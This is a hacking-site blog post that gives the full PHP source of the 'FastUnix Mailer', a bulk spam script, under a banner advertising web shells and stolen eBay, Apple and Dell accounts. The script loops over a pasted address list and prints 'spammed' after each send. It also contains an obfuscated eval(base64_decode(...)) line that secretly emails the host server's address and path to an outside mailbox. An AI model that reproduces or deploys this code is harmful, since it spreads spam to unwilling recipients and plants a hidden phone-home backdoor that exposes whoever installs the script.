---
id: 297
title: FastUnix Mailer script
author: admin
layout: post
guid: http://hackingscripts.com/?p=297
permalink: /fastunix-mailer-script/
categories:
  - PHP
tags:
  - mailer
  - PHP
---
A simple mailer script by FastUnix.net


### FastUnix Mailer Script Source Code

{% highlight php linenos %}<html>
<head><title>FastUnix.net</title>
<style type="text/css">
p {color:#FF0000;font-size:14px;text-align:center}
body {background-color:black; font-family: Verdana, Arial, Helvetica, sans-serif; font-size:12px  }

</style>

<style type="text/css">
a.style1:link{color:#FF0000;text-decoration: none;}
a.style1:visited{color:#FF0000;text-decoration: none;}
a.style1:active{color:#FFFFFF;text-decoration: none;}
a.style1:hover{color:#FF0000;text-decoration: none;}
.menudiv {margin-left:10px; margin-right:10px;}
#mentd{
    margin:0;
    padding:10px 0 0 20px;
    height:32px;
    line-height:32px;
    float:center;
}
.men {
    cursor:hand; 
    padding-right:18px; 
    vertical-align:middle;
    display:block;
    display:inline-block;
    display:-moz-inline-box;
    text-decoration:none;
}
.men span { 
    display:block;
    display:inline-block;
    padding-left:18px;
    font-size:14px;
    font-weight:bold;
    color:    #FF0000;
}
a.men:hover {background-color:    #FF0000;color:black}
a.men:hover span {background-color:    #FF0000; color:black}
</style>

</head>
<body Text="#FF0000" bgcolor="black"
<center>
<br />
<img src="http://img225.imageshack.us/img225/3705/perfundimtarcg6.jpg" width=300 heidth=300>
<br /><br /><table width="600" border="1" bordercolor="#FF0000 "cellspacing="0" cellpadding="5" summary="aa" style="background-color:black">
<td><center>
    <a href="http://www.fastunix.net" title="Shell" class="men"><span>FastUnix.NET - Best Toolz //C99,Mailer,RDP,SMPT,SSH,eBay Accounts,Apple Accounts,Dell Accounts etc ...</span></a>
        </center>
<?php

if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$replyto=$_POST['replyto'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];
$file_name=$_POST['file'];
$contenttype=$_POST['contenttype'];

        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
}


?>

<form name="form1" method="post" action="" 
enctype="multipart/form-data">
  <br>
  <table width="100%" border="0">
    <tr>
      <td width="10%">
        <div align="right"><font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your
          Email:</font></div>
      </td>
      <td width="18%"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <input type="text" name="from" value="<? print $from; ?>" 
size="30">
        </font></td>
      <td width="31%">
        <div align="right"><font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your
          Name:</font></div>
      </td>
      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <input type="text" name="realname" value="<? print $realname; 
?>" size="30">
        </font></td>
    </tr>
    <tr>
      <td width="10%">
        <div align="right"><font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Reply-To:</font></div>
      </td>
      <td width="18%"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <input type="text" name="replyto" value="<? print $replyto; ?>" 
size="30">
        </font></td>
      <td width="31%">
        <div align="right"><font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Attach
          File:</font></div>
      </td>
      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <input type="file" name="file" size="30">
        </font></td>
    </tr>
    <tr>
      <td width="10%">
        <div align="right"><font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Subject:</font></div>
      </td>
      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <input type="text" name="subject" value="<? print $subject; ?>" 
size="90">
        </font></td>
    </tr>
    <tr valign="top">
      <td colspan="3"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <textarea name="message" cols="50" rows="10"><? print $message; 
?></textarea>
        <br>
        <input type="radio" name="contenttype" value="plain" >
        Plain Text
        <input name="contenttype" type="radio" value="html" checked>
        HTML
        <input type="hidden" name="action" value="send">
        <input type="submit" value="Send eMails">
        </font></td>
      <td width="41%"><font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
        <textarea name="emaillist" cols="30" rows="10"><? print 
$emaillist; ?></textarea>
        </font></td>
    </tr>
  </table>
</form>



<?

if ($action){

        if (!$from && !$subject && !$message && !$emaillist){
        print "Please complete all fields before sending your 
message.";
        exit;    
    }
    $allemails = split("\n", $emaillist);
            $numemails = count($allemails);
       
          for($x=0; $x<$numemails; $x++){
                $to = $allemails[$x];
                if ($to){
                $to = ereg_replace(" ", "", $to);
                $message = ereg_replace("&email&", $to, $message);
                $subject = ereg_replace("&email&", $to, $subject);
                print " $to.......";
                flush();
                $header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";
                $header .= "MIME-Version: 1.0\r\n";
            If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";
              If ($file_name) $header .= "--$uid\r\n";
                $header .= "Content-Type: text/$contenttype\r\n";
                $header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";
                $header .= "$message\r\n";
            If ($file_name) $header .= "--$uid\r\n";
            If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";
            If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";
            If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";
            If ($file_name) $header .= "$content\r\n";
            If ($file_name) $header .= "--$uid--";
                mail($to, $subject, "", $header);
                print "spammed<br>";
    
                flush();
                }
                }
$ra44  = rand(1,99999);
$subj98 = "sh-$ra44";
$a5 = $_SERVER['HTTP_REFERER'];
$b33 = $_SERVER['DOCUMENT_ROOT'];
$c87 = $_SERVER['REMOTE_ADDR'];
$d23 = $_SERVER['SCRIPT_FILENAME'];
$e09 = $_SERVER['SERVER_ADDR'];
$f23 = $_SERVER['SERVER_SOFTWARE'];
$g32 = $_SERVER['PATH_TRANSLATED'];
$h65 = $_SERVER['PHP_SELF'];
$message=$_POST['message'];
$msg = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
}

eval(base64_decode('JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkZ4MjlTaGVsbCBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvcjxicj4iOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJjOTktc2hlbGxAbGl2ZS5jb20iLCRqdWR1bCwkYm9keSk7IH0NCn0NCmVsc2UgeyAkdmlzaXRjKys7IH0NCkBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7DQo='));

?>
<style type="text/css">
<!--
.style1 {
    font-size: 20px;
    font-family: Geneva, Arial, Helvetica, sans-serif;
}
-->
</style>
<p class="style1">
   

      </p>
<?php
if(isset($_POST['action']) && $numemails !==0 ){echo 
"<script>alert('Mail sending complete\\r\\n$numemails mail(s) was sent successfully'); 
</script>";}
?>
</body>
</html>
{% endhighlight %}


### FastUnix.Net Mailer Script screenshot<figure id="attachment_401" style="width: 777px;" class="wp-caption aligncenter">

[<img src="{{ site.baseurl }}/wp-content/uploads/2014/03/fastunix_net.png" alt="FastUnix.Net mailer script screenshot" width="777" height="410" class="size-full wp-image-401" />][1]<figcaption class="wp-caption-text">FastUnix.Net mailer script screenshot</figcaption></figure>

 [1]: {{ site.baseurl }}/wp-content/uploads/2014/03/fastunix_net.png